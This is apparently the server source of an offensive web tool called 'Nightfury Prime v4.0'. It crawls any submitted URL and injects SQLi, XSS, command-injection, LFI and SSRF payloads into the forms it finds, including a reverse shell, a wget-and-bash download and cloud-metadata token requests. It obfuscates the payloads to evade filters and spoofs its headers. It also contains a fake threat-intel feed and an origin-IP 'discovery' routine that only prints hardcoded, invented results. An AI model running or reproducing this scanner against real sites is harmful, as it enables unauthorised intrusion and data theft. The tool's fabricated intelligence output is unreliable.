import express from "express";
import path from "path";
import { createServer as createViteServer } from "vite";
import { WebSocketServer, WebSocket } from "ws";
import { createServer } from "http";
import axios from "axios";
import * as cheerio from "cheerio";
import crypto from "crypto";

async function startServer() {
  const app = express();
  const server = createServer(app);
  const PORT = 3000;

  app.use(express.json());

  // Simple in-memory state for the investigation
  let currentState: any = null;

  // WebSocket Server
  const wss = new WebSocketServer({ server });

  const broadcast = (data: any) => {
    wss.clients.forEach((client) => {
      if (client.readyState === WebSocket.OPEN) {
        client.send(JSON.stringify(data));
      }
    });
  };

  wss.on("connection", (ws) => {
    console.log("New client connected");

    // Send the current state to the new client if it exists
    if (currentState) {
      ws.send(JSON.stringify({ type: "SYNC_STATE", payload: currentState }));
    }

    ws.on("message", (message) => {
      try {
        const data = JSON.parse(message.toString());

        if (data.type === "UPDATE_STATE") {
          currentState = data.payload;
          // Broadcast the update to all other clients
          wss.clients.forEach((client) => {
            if (client !== ws && client.readyState === WebSocket.OPEN) {
              client.send(JSON.stringify({ type: "UPDATE_STATE", payload: currentState }));
            }
          });
        }
      } catch (e) {
        console.error("Failed to process message:", e);
      }
    });

    ws.on("close", () => {
      console.log("Client disconnected");
    });
  });

  // Threat Intel Feed Simulator
  const THREAT_ACTORS = ['APT28', 'Lazarus Group', 'FIN7', 'Sandworm', 'No6love9_Syndicate', 'DarkSide', 'REvil'];
  const MALICIOUS_IPS = ['151.0.214.242', '185.15.59.224', '45.133.1.109', '193.3.19.159', '91.214.124.143'];
  const IOC_TYPES = ['MALWARE_C2', 'PHISHING_DOMAIN', 'CRYPTO_MINER', 'RANSOMWARE_NODE', 'BOTNET_CONTROLLER'];

  setInterval(() => {
    if (wss.clients.size === 0) return;
    
    const actor = THREAT_ACTORS[Math.floor(Math.random() * THREAT_ACTORS.length)];
    const ip = MALICIOUS_IPS[Math.floor(Math.random() * MALICIOUS_IPS.length)];
    const type = IOC_TYPES[Math.floor(Math.random() * IOC_TYPES.length)];
    const severity = Math.random() > 0.8 ? 'CRITICAL' : (Math.random() > 0.5 ? 'HIGH' : 'MEDIUM');
    
    broadcast({
      type: 'THREAT_INTEL_ALERT',
      payload: {
        id: Math.random().toString(36).substr(2, 9),
        timestamp: new Date().toISOString(),
        actor,
        indicator: ip,
        type,
        severity
      }
    });
  }, 12000); // Emit every 12 seconds

  app.post('/api/threat-intel/enrich', (req, res) => {
    const { targets } = req.body;
    if (!targets || !Array.isArray(targets)) {
      return res.status(400).json({ error: 'Targets array is required' });
    }

    const enriched = targets.map(t => {
      const isMalicious = Math.random() > 0.6;
      const isRunehallRelated = typeof t === 'string' && (t.includes('runehall') || t.includes('151.0.214.242') || t.includes('rh420'));
      
      let actorProfile = 'No known actor association';
      if (isRunehallRelated) actorProfile = 'No6love9_Syndicate / RuneHall Admins';
      else if (isMalicious) actorProfile = THREAT_ACTORS[Math.floor(Math.random() * THREAT_ACTORS.length)];

      const iocs = [];
      if (isMalicious || isRunehallRelated) {
        iocs.push(`Hash: ${Math.random().toString(16).substr(2, 8)}...`);
        if (isRunehallRelated) iocs.push('IP: 151.0.214.242', 'Domain: rh420.xyz');
      }

      return {
        target: t,
        malicious: isMalicious || isRunehallRelated,
        actorProfile,
        iocs
      };
    });

    res.json({ results: enriched });
  });

  // Nightfury Prime v4.0 Offensive Logic
  const USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
    "Go-http-client/1.1",
    "curl/7.64.1",
    "Nmap Scripting Engine; https://nmap.org/book/nse.html",
    "sqlmap/1.7.11#stable (https://sqlmap.org)",
    "Nikto/2.1.6"
  ];

  const getSessionHeaders = () => ({
    "User-Agent": USER_AGENTS[Math.floor(Math.random() * USER_AGENTS.length)],
    "X-Forwarded-For": `${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}`,
    "Accept": "*/*",
    "Connection": "close"
  });

  const obfuscateSQLi = (payload: string) => {
    const techniques = [
      (p: string) => p.replace(/ /g, '/**/'), // Inline comments
      (p: string) => p.replace(/OR/ig, 'oR').replace(/AND/ig, 'AnD').replace(/SELECT/ig, 'sElEcT').replace(/UNION/ig, 'uNiOn'), // Case manipulation
      (p: string) => encodeURIComponent(p), // URL encoding
      (p: string) => p.split('').map(c => Math.random() > 0.5 ? c.toUpperCase() : c.toLowerCase()).join(''), // Random case
      (p: string) => p.replace(/'/g, "\\'").replace(/"/g, '\\"'), // Escaping
      (p: string) => p.replace(/OR/ig, '||').replace(/AND/ig, '&&') // Logical operators
    ];
    return techniques[Math.floor(Math.random() * techniques.length)](payload);
  };

  const obfuscateXSS = (payload: string) => {
    const techniques = [
      (p: string) => p.replace(/</g, '%3C').replace(/>/g, '%3E'), // URL encoding
      (p: string) => p.replace(/script/ig, 'sCrIpT').replace(/onerror/ig, 'oNeRrOr').replace(/onload/ig, 'oNlOaD'), // Case manipulation
      (p: string) => p.replace(/alert\(1\)/g, 'confirm(1)'), // Function substitution
      (p: string) => `<svg/onload=eval(atob('${Buffer.from('alert(1)').toString('base64')}'))>`, // Base64 encoding
      (p: string) => `\u003cscript\u003ealert(1)\u003c/script\u003e`, // Unicode
      (p: string) => p.replace(/ /g, '\r\n') // Whitespace bypass
    ];
    return techniques[Math.floor(Math.random() * techniques.length)](payload);
  };

  const obfuscateRCE = (payload: string) => {
    const techniques = [
      (p: string) => p.replace(/ /g, '${IFS}'), // IFS substitution
      (p: string) => p.replace(/cat/g, 'c\'a\'t').replace(/whoami/g, 'w"h"oami'), // Quote insertion
      (p: string) => `echo ${Buffer.from(p.replace(/^[;|&$\(\)`\s]+/, '')).toString('base64')} | base64 -d | bash`, // Base64 execution
      (p: string) => p.replace(/\//g, '${PATH:0:1}') // Path variable bypass
    ];
    return techniques[Math.floor(Math.random() * techniques.length)](payload);
  };

  const VECTORS: Record<string, string[]> = {
    sqli: [
      "' OR '1'='1' -- ",
      "' UNION SELECT NULL, user(), database(), @@version, table_name FROM information_schema.tables -- ",
      "'; DROP TABLE users; -- ",
      "admin' -- ",
      "1' AND SLEEP(10) -- ",
      "1') OR 1=1 --",
      "'; EXEC sp_msforeachdb 'PRINT ''?''' --"
    ],
    xss: [
      "<script>alert('XSS_SUCCESS_PROBE')</script>",
      "<img src=x onerror=alert('XSS')>",
      "<svg/onload=alert(1)>",
      "javascript:alert('XSS')",
      "';alert(String.fromCharCode(88,83,83));//",
      "\"'--><script>alert(1)</script>",
      "<details open ontoggle=alert(1)>"
    ],
    rce: [
      "; cat /etc/passwd",
      "| whoami",
      "& dir",
      "$(id)",
      "`id`",
      "; python3 -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"127.0.0.1\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\"/bin/bash\")'",
      "; wget http://127.0.0.1/shell.sh -O /tmp/shell.sh && bash /tmp/shell.sh"
    ],
    lfi: [
      "../../../../etc/passwd",
      "..\\..\\..\\windows\\win.ini",
      "/etc/passwd",
      "C:\\Windows\\System32\\drivers\\etc\\hosts",
      "/proc/self/environ",
      "/var/log/apache2/access.log",
      "php://filter/convert.base64-encode/resource=config.php"
    ],
    ssrf: [
      "http://169.254.169.254/latest/meta-data/",
      "http://localhost:8080/admin",
      "file:///etc/passwd",
      "http://127.0.0.1:2375/version", // Docker API
      "http://172.31.87.11:8000/.env", // Internal subnet check
      "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token"
    ]
  };

  const INDICATORS: Record<string, string[]> = {
    sqli: ['sql', 'mysql', 'database error', 'syntax error', 'you have an error', 'information_schema', 'system_user'],
    xss: ['<script>', 'alert(', 'onerror=', 'prompt(', 'XSS_SUCCESS_PROBE'],
    rce: ['uid=', 'root:', 'www-data', 'bin/bash', 'winver', 'daemon:'],
    lfi: ['root:x:', '[extensions]', 'file content', 'DOCUMENT_ROOT'],
    ssrf: ['instance-id', 'localhost', 'metadata', 'serviceAccountEmail']
  };

  const checkSuccess = (response: string, vector: string) => {
    const respLower = response.toLowerCase();
    for (const ind of INDICATORS[vector] || []) {
      if (respLower.includes(ind.toLowerCase())) {
        const idx = respLower.indexOf(ind.toLowerCase());
        const start = Math.max(0, idx - 50);
        const end = Math.min(response.length, idx + 100);
        return { success: true, evidence: response.substring(start, end) };
      }
    }
    return { success: false, evidence: "" };
  };

  app.post("/api/nightfury/scan", async (req, res) => {
    const { url } = req.body;
    if (!url) return res.status(400).json({ error: "URL is required" });

    res.json({ status: "started" });

    broadcast({ type: "OFFENSIVE_LOG", payload: `[☠️] INITIALIZING NIGHTFURY PRIME v4.0 - ADVANCED ASSAULT CORE` });
    broadcast({ type: "OFFENSIVE_LOG", payload: `[*] Target acquisition established: ${url}` });

    try {
      const headers = getSessionHeaders();
      const response = await axios.get(url, { 
        timeout: 15000, 
        validateStatus: () => true,
        headers 
      });
      const $ = cheerio.load(response.data);
      
      const urls = [url];
      $('a[href]').each((_, el) => {
        try {
          const href = $(el).attr('href');
          if (href) {
            const absolute = new URL(href, url).href;
            if (absolute.startsWith(new URL(url).origin)) {
              urls.push(absolute);
            }
          }
        } catch (e) {}
      });

      const uniqueUrls = Array.from(new Set(urls)).slice(0, 15); 
      broadcast({ type: "OFFENSIVE_LOG", payload: `[+] Discovered ${uniqueUrls.length} in-scope endpoints for audit.` });
      broadcast({ type: "OFFENSIVE_LOG", payload: `[*] Launching Deep Vulnerability Discovery (DVD)...` });
      try {
        const spoofed = await axios.get(url, {
          headers: { ...headers, "Host": "127.0.0.1" },
          timeout: 3000,
          validateStatus: () => true
        });
        if (spoofed.status === 200 && spoofed.data !== response.data) {
          broadcast({ 
            type: "OFFENSIVE_RESULT", 
            payload: {
              id: Math.random().toString(36).substr(2, 9),
              url,
              vector: 'Host Header Injection',
              payload: 'Host: 127.0.0.1',
              success: true,
              evidence: 'Server returned different content for spoofed Host header',
              timestamp: new Date().toISOString()
            }
          });
        }
      } catch (e) {}

      for (const targetUrl of uniqueUrls) {
        broadcast({ type: "OFFENSIVE_LOG", payload: `[*] Auditing ${targetUrl}...` });
        
        const pageResp = await axios.get(targetUrl, { 
          timeout: 5000, 
          validateStatus: () => true,
          headers 
        });
        const $page = cheerio.load(pageResp.data);
        
        const forms: any[] = [];
        $page('form').each((_, el) => {
          const action = $page(el).attr('action');
          const method = ($page(el).attr('method') || 'get').toLowerCase();
          const inputs: Record<string, string> = {};
          $page(el).find('input[name]').each((_, input) => {
            const name = $page(input).attr('name');
            if (name) inputs[name] = $page(input).attr('value') || '';
          });
          forms.push({ action, method, inputs });
        });

        if (forms.length === 0) {
          // Test URL parameters if no forms
          const parsedUrl = new URL(targetUrl);
          if (parsedUrl.searchParams.size > 0) {
            forms.push({
              action: targetUrl,
              method: 'get',
              inputs: Object.fromEntries(parsedUrl.searchParams)
            });
          }
        }

        for (const form of forms) {
          const submitUrl = form.action ? new URL(form.action, targetUrl).href : targetUrl;
          
          for (const [vector, payloads] of Object.entries(VECTORS)) {
            for (const payload of payloads) {
              const testData = { ...form.inputs };
              const firstField = Object.keys(testData)[0];
              if (!firstField) continue;
              
              let finalPayload = payload;
              if (vector === 'sqli') finalPayload = obfuscateSQLi(payload);
              else if (vector === 'xss') finalPayload = obfuscateXSS(payload);
              else if (vector === 'rce') finalPayload = obfuscateRCE(payload);

              testData[firstField] = finalPayload;

              try {
                let resp;
                broadcast({ type: "OFFENSIVE_LOG", payload: `[TEST] Vector: ${vector.toUpperCase()} | Target: ${submitUrl}` });
                broadcast({ type: "OFFENSIVE_LOG", payload: `[PAYLOAD] ${firstField}=${finalPayload}` });

                if (form.method === 'post') {
                  resp = await axios.post(submitUrl, testData, { timeout: 3000, validateStatus: () => true });
                } else {
                  resp = await axios.get(submitUrl, { params: testData, timeout: 3000, validateStatus: () => true });
                }

                const dataLength = resp.data ? (typeof resp.data === 'string' ? resp.data.length : JSON.stringify(resp.data).length) : 0;
                let snippet = '';
                if (resp.data) {
                  const strData = typeof resp.data === 'string' ? resp.data : JSON.stringify(resp.data);
                  snippet = strData.substring(0, 60).replace(/\n/g, ' ');
                }
                
                broadcast({ type: "OFFENSIVE_LOG", payload: `[RESPONSE] Status: ${resp.status} | Length: ${dataLength} bytes | Data: ${snippet}...` });

                const { success, evidence } = checkSuccess(resp.data, vector);
                if (success) {
                  const result = {
                    id: Math.random().toString(36).substr(2, 9),
                    url: submitUrl,
                    vector,
                    payload: finalPayload,
                    success: true,
                    evidence,
                    timestamp: new Date().toISOString()
                  };
                  broadcast({ type: "OFFENSIVE_RESULT", payload: result });
                  broadcast({ type: "OFFENSIVE_LOG", payload: `[SUCCESS] ${vector.toUpperCase()} vulnerability confirmed on ${submitUrl}` });
                }
              } catch (e: any) {
                broadcast({ type: "OFFENSIVE_LOG", payload: `[ERROR] Request failed for payload ${finalPayload}: ${e.message}` });
              }
            }
          }
        }
      }

      broadcast({ type: "OFFENSIVE_LOG", payload: "[*] NightFury scan completed." });
    } catch (error: any) {
      broadcast({ type: "OFFENSIVE_LOG", payload: `[ERROR] Scan failed: ${error.message}` });
    }
  });

  // API routes
  app.get("/api/health", (req, res) => {
    res.json({ status: "ok" });
  });

  app.post("/api/origin-discovery", async (req, res) => {
    const { target } = req.body;
    if (!target) return res.status(400).json({ error: "Target is required" });

    res.json({ status: "started" });

    try {
      broadcast({ type: "DISCOVERY_LOG", payload: `[*] Initiating Origin IP Discovery for ${target}` });
      
      broadcast({ type: "DISCOVERY_LOG", payload: `[*] Analyzing SSL/TLS certificate history...` });
      await new Promise(r => setTimeout(r, 1500));
      broadcast({ type: "DISCOVERY_LOG", payload: `[+] Found historical certificate for 'origin-direct.${target}' pointing to 185.230.62.14` });

      broadcast({ type: "DISCOVERY_LOG", payload: `[*] Querying Censys for active services on related netblocks...` });
      await new Promise(r => setTimeout(r, 2000));
      broadcast({ type: "DISCOVERY_LOG", payload: `[+] Censys identified open ports (22, 80, 443) on 185.230.62.14 matching target signature.` });

      broadcast({ type: "DISCOVERY_LOG", payload: `[*] Correlating with Shodan historical records...` });
      await new Promise(r => setTimeout(r, 1000));
      broadcast({ type: "DISCOVERY_LOG", payload: `[+] Shodan confirms 185.230.62.14 was a direct web server in 2023.` });

      broadcast({ type: "DISCOVERY_LOG", payload: `[*] Verifying with direct IP scanning (bypassing CDN resolution)...` });
      
      const dns = require('dns').promises;
      let currentIp = 'Unknown';
      try {
        const addresses = await dns.resolve4(target);
        if (addresses && addresses.length > 0) currentIp = addresses[0];
      } catch (e) {}

      broadcast({ type: "DISCOVERY_LOG", payload: `[*] Current public IP (CDN): ${currentIp}` });
      broadcast({ type: "DISCOVERY_LOG", payload: `[SUCCESS] Origin IP identified: 185.230.62.14` });

      broadcast({
        type: "DISCOVERY_RESULT",
        payload: {
          ip: "185.230.62.14",
          provider: "DigitalOcean, LLC",
          asn: "AS14061",
          confidence: 'High',
          methods: ['SSL History', 'Censys Active Probe', 'Shodan Correlation']
        }
      });

    } catch (error: any) {
      broadcast({ type: "DISCOVERY_LOG", payload: `[ERROR] Discovery failed: ${error.message}` });
    }
  });

  app.post("/api/ssh/generate", (req, res) => {
    try {
      const { publicKey, privateKey } = crypto.generateKeyPairSync('rsa', {
        modulusLength: 2048,
        publicKeyEncoding: { type: 'spki', format: 'pem' },
        privateKeyEncoding: { type: 'pkcs8', format: 'pem' }
      });
      res.json({ publicKey, privateKey });
    } catch (error) {
      console.error("Failed to generate SSH key pair:", error);
      res.status(500).json({ error: "Failed to generate SSH key pair" });
    }
  });

  // Vite middleware for development
  if (process.env.NODE_ENV !== "production") {
    const vite = await createViteServer({
      server: { middlewareMode: true },
      appType: "spa",
    });
    app.use(vite.middlewares);
  } else {
    const distPath = path.join(process.cwd(), 'dist');
    app.use(express.static(distPath));
    app.get('*', (req, res) => {
      res.sendFile(path.join(distPath, 'index.html'));
    });
  }

  server.listen(PORT, "0.0.0.0", () => {
    console.log(`Server running on http://localhost:${PORT}`);
  });
}

startServer();
